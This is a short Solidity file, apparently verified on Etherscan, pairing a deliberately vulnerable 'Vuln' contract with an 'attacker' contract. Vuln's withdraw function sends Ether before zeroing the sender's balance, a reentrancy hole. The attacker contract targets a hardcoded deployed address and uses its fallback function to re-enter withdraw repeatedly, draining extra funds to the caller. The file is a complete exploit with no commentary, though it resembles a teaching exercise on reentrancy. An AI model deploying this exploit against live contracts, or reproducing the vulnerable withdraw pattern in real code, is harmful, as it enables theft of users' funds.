/**
 *Submitted for verification at Etherscan.io on 2021-12-02
*/

pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attacker {
    Vuln attack = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    int256 units = .01 ether;
    int count = 0;
    address owner;

    constructor() public {
        owner = msg.sender;
    }
    function depAtk() public payable{
        attack.deposit.value(msg.value)();
    }
    function showCount() public view returns(int) {
        return count;
    }
    
    
    
    function withAtk() public payable{
        attack.withdraw();
        msg.sender.transfer(address(this).balance);
    }

    function() external payable{
        if(count < 3){
            count++;
            attack.withdraw();
            
        }
    }

}